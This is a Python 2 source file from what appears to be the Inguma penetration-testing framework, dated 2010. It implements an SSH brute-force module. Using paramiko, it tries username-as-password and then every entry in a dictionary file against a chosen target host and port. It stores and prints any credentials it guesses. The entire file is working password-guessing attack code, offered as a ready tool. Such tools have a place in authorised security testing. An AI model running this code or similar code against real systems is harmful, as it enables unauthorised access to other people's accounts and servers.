#!/usr/bin/python

##      CSshBrute.py
#       
#       Copyright 2010 Joxean Koret <joxeankoret@yahoo.es>
#       
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#       
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#       
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

import os
import sys
import time
import string
import paramiko

from lib.module import CIngumaModule

name = "brutessh"
brief_description = "A simple SSH brute force tool"
type = "gather"

class CSshBrute(CIngumaModule):

    exploitType = 3
    services = ""
    results = {}
    user = ""
    transport = None

    def help(self):
        print "target = <target host or network>"
        print "port = <port>"
        print "user = <username>"

    def bruteForce(self):
        userList = [self.user, ]
        self.open()
    
        try:
            self.gom.echo( "Trying " + self.user + "/" + self.user )
            self.login(self.user, self.user)
            self.addToDict(self.target + "_passwords", self.user + "/" + self.user)
            self.results[self.user] = self.user
            return True
        except:
            # Well, first try :)
            pass
        
        for user in userList:
            for passwd in self.getPasswordList():
                time.sleep(self.waitTime)
                try:
                    passwd = passwd.replace("\n", "").replace("\r", "")
                    self.gom.echo( "Trying " + user + "/" + passwd + "..." )
                    self.login(user, passwd)
                    sys.stdout.write("\b"  * 80)
                    self.addToDict(self.target + "_passwords", self.user + "/" + passwd)
                    self.results[user] = passwd
            
                    return True
                except KeyboardInterrupt:
                    self.gom.echo( "Aborted." )
                    return False
                except:
                    pass

        return False

    def getPasswordList(self):
        fname = self.dict["base_path"]
        if fname != "" :
            fname += os.sep + "data" + os.sep + "dict"
        else:
            fname = "data" + os.sep + "dict"

        f = file(fname, "r")
        return f.readlines()

    def open(self):
        try:
            self.transport = paramiko.Transport((self.target, int(self.port)))
        except:
            self.gom.echo( sys.exc_info()[1] )

    def login(self, user, thepassword):
        self.transport.connect(username=user, password=thepassword)

    def close(self):
        try:
            self.transport.close()
        except:
            sys.exc_info()[1]

    def run(self):
        if self.target == "":
            self.gom.echo( "No target specified" )
            return False
        
        if self.user == "":
            self.gom.echo( "No user specified" )
            return False

        if self.port == 0 or self.port == "":
            self.port = 22

        self.bruteForce()
        return True

    def printSummary(self):
        self.gom.echo( "" )
        for x in self.results:
            self.gom.echo( "[+] User guessed: " + x + "/" + self.results[x] )
